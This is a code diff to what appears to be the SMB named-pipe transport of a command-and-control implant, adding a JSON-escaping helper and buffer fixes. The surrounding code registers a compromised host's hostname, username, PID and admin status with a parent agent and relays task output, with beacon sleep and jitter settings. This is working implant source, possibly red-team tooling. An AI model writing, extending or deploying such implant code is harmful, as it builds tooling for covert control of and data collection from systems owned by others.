@@ -13,6 +13,53 @@
 // Global pipe handle — opened once during register, kept for beacon/result.
 static HANDLE g_smb_pipe = INVALID_HANDLE_VALUE;
 
+/* Escape a string before embedding it in a JSON string value.  SMB messages
+ * can contain Windows paths (backslashes), command output, quotes and
+ * newlines; emitting those bytes verbatim makes the parent reject the frame. */
+static char* smb_json_escape(const char *s) {
+    if (!s) return _strdup("");
+
+    size_t need = 1;
+    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
+        switch (*p) {
+        case '"': case '\\': case '\n': case '\r': case '\t':
+        case '\b': case '\f':
+            need += 2;
+            break;
+        default:
+            need += (*p < 0x20) ? 6 : 1;
+            break;
+        }
+    }
+
+    char *out = (char*)malloc(need);
+    if (!out) return NULL;
+    size_t n = 0;
+    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
+        switch (*p) {
+        case '"':  out[n++] = '\\'; out[n++] = '"';  break;
+        case '\\': out[n++] = '\\'; out[n++] = '\\'; break;
+        case '\n': out[n++] = '\\'; out[n++] = 'n';  break;
+        case '\r': out[n++] = '\\'; out[n++] = 'r';  break;
+        case '\t': out[n++] = '\\'; out[n++] = 't';  break;
+        case '\b': out[n++] = '\\'; out[n++] = 'b';  break;
+        case '\f': out[n++] = '\\'; out[n++] = 'f';  break;
+        default:
+            if (*p < 0x20) {
+                static const char hex[] = "0123456789abcdef";
+                out[n++] = '\\'; out[n++] = 'u';
+                out[n++] = '0'; out[n++] = '0';
+                out[n++] = hex[*p >> 4]; out[n++] = hex[*p & 0x0f];
+            } else {
+                out[n++] = (char)*p;
+            }
+            break;
+        }
+    }
+    out[n] = '\0';
+    return out;
+}
+
 // ── Framing helpers ───────────────────────────────────────────────────────────
 
 // Write a 4-byte LE length prefix followed by data.
@@ -97,10 +144,11 @@ int transport_smb_register(void) {
     ULONG usz=sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
         GetUserNameA(username, (DWORD*)&usz);
-    char username_j[512]={0};
-    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
-        if (username[_i]=='\\') username_j[_j++]='\\';
-        username_j[_j++]=username[_i];
+    char *hostname_j = smb_json_escape(hostname);
+    char *username_j = smb_json_escape(username);
+    if (!hostname_j || !username_j) {
+        free(hostname_j); free(username_j);
+        return 0;
     }
 
     /* Inline elevation check (TOKEN_ELEVATION). */
@@ -114,13 +162,14 @@ int transport_smb_register(void) {
         }
     }
 
-    char body[1024];
+    char body[2048];
     snprintf(body, sizeof(body),
         "{\"type\":\"REGISTER\",\"hostname\":\"%s\",\"username\":\"%s\","
         "\"os\":\"windows/amd64\",\"pid\":%lu,\"transport\":\"smb\","
         "\"sleep_sec\":%d,\"jitter_pct\":%d,\"is_admin\":%s,\"language\":\"c\"}",
-        hostname, username_j, (unsigned long)GetCurrentProcessId(),
+        hostname_j, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_SLEEP_SEC, AGENT_JITTER_PCT, elevated ? "true" : "false");
+    free(hostname_j); free(username_j);
 
     if (!pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body)))
         return 0;
@@ -204,15 +253,26 @@ void transport_smb_send_result(long long task_id, const char *output,
                                 const char *error, int is_admin) {
     if (g_smb_pipe == INVALID_HANDLE_VALUE) return;
 
-    size_t body_sz = (output?strlen(output):0) + (error?strlen(error):0) + 256;
+    char *output_j = smb_json_escape(output ? output : "");
+    char *error_j  = smb_json_escape(error ? error : "");
+    if (!output_j || !error_j) {
+        free(output_j); free(error_j);
+        return;
+    }
+
+    size_t body_sz = strlen(output_j) + strlen(error_j) + 256;
     char *body = (char*)malloc(body_sz);
-    if (!body) return;
+    if (!body) {
+        free(output_j); free(error_j);
+        return;
+    }
     snprintf(body, body_sz,
         "{\"type\":\"RESULT\",\"agent_id\":\"%s\",\"task_id\":%lld,"
         "\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
         g_agent.agent_id, task_id,
-        output?output:"", error?error:"",
+        output_j, error_j,
         is_admin?"true":"false");
+    free(output_j); free(error_j);
 
     pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body));
     free(body);
